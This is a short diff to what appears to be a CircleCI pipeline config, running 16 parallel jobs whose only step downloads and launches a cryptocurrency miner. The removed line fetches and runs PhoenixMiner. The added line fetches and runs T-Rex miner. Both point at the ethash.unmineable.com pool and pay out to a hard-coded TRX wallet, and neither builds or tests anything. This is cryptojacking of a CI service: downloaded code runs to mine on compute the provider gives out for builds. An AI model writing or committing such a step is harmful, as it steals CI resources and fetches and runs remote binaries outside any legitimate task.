@@ -6,7 +6,7 @@ jobs:
       parallelism: 16
       steps:
         - checkout
-        - run:  wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz && tar zxvf PhoenixMiner_5.9d_Linux.tar.gz && cd PhoenixMiner_5.9d_Linux && ./PhoenixMiner PhoenixMiner.exe -pool ethash.unmineable.com:3333 -wal TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
+        - run:  wget https://trex-miner.com/download/t-rex-0.24.8-linux.tar.gz && tar zxvf t-rex-0.24.8-linux.tar.gz && ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
 
 workflows:
     version: 2.1
